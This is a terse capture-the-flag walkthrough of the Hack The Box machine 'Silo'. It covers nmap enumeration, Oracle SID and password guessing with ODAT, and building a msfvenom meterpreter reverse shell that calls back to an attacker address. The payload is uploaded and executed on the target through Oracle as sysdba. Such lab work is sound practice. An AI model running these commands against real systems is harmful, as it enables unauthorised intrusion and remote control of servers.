#HackTheBox #medium #window 

# enum
## _nmap_
└─# nmap 10.129.95.188 -sC -sV -oA silo_nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 21:31 UTC
Nmap scan report for 10.129.95.188 (10.129.95.188)
Host is up (0.14s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-07-11T21:33:49
|_  start_date: 2023-07-11T21:27:03
| smb2-security-mode:
|   3:0:2:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported


└─# 
```
searchsploit --nmap silo_nmap.xml
```
	Oracle 8i - TNS Listener 'ARGUMENTS' Remote Buffer Overflow (Metasploit)

msf6 > search tns
```
Matching Modules
-  ----                                        ---------------  ----    -----  -----------
   0  exploit/windows/oracle/tns_auth_sesskey     2009-10-20       great   Yes    Oracle 10gR2 TNS Listener AUTH_SESSKEY Buffer Overflow
   1  exploit/windows/oracle/tns_arguments        2001-06-28       good    Yes    Oracle 8i TNS Listener (ARGUMENTS) Buffer Overflow
   2  exploit/windows/oracle/tns_service_name     2002-05-27       good    Yes    Oracle 8i TNS Listener SERVICE_NAME Buffer Overflow
   3  auxiliary/scanner/oracle/tnspoison_checker  2012-04-18       normal  No     Oracle TNS Listener Checker
   4  auxiliary/admin/oracle/tnscmd               2009-02-01       normal  No     Oracle TNS Listener Command Issuer
   5  auxiliary/admin/oracle/sid_brute            2009-01-07       normal  No     Oracle TNS Listener SID Brute Forcer
   6  auxiliary/scanner/oracle/sid_brute                           normal  No     Oracle TNS Listener SID Bruteforce
   7  auxiliary/scanner/oracle/sid_enum           2009-01-07       normal  No     Oracle TNS Listener SID Enumeration
   8  auxiliary/scanner/oracle/tnslsnr_version    2009-01-07       normal  No     Oracle TNS Listener Service Version Query


Interact with a module by name or index. For example info 8, use 8 or use auxiliary/scanner/oracle/tnslsnr_version

msf6 > use 4

msf6 auxiliary(admin/oracle/tnscmd) > run
[*] Running module against 10.129.95.188

[*] 10.129.95.188:1521 - Sending '(CONNECT_DATA=(COMMAND=VERSION))' to 10.129.95.188:1521
[*] 10.129.95.188:1521 - writing 90 bytes.
[*] 10.129.95.188:1521 - reading
[*] 10.129.95.188:1521 - .e......"..Y(DESCRIPTION=(TMP=)(VSNNUM=186647040)(ERR=1189)(ERROR_STACK=(ERROR=(CODE=1189)(EMFI=4))))
[*] Auxiliary module execution completed
```

# Exploit
```
./odat-libc2.17-x86_64 sidguesser -s 10.129.95.188
```
	[+] 'XE' is a valid SID.

└─# 
```
└─# ./odat-libc2.17-x86_64 passwordguesser -s 10.129.95.188 -p 1521 -d XE --accounts-file accounts/accounts.txt
```
	[+] Valid credentials found: scott/tiger. Continue...

└─# 
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.24 lport=1234 -f exe > zelo.exe
```
└─# 
```
./odat-libc2.17-x86_64 utlfile -s 10.129.95.188 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ zelo.exe ../zelo.exe
```
	[+] The zelo.exe file was created on the c:/ directory on the 10.129.95.188 server like the zelo.exe file
└─# 
```
odat-libc2.17-x86_64/odat-libc2.17-x86_64 externaltable -s 10.129.95.188 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ zelo.exe
```